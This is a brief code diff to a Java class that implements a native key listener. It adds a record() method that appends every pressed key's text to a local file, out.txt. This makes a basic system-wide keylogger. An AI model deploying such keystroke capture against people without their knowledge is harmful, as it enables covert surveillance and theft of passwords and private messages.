@@ -39,12 +39,24 @@ public class Main implements NativeKeyListener{
 		//} else {
 		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//}
+		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		}
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {
 		// TODO Auto-generated method stub
 		
+	}
+	public static void record(String x) {
+		try {
+			PrintWriter out = new PrintWriter(new FileWriter("out.txt", true));
+			// System.out.println("rec " + x);
+			out.print(x);
+			out.close();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 	
 }
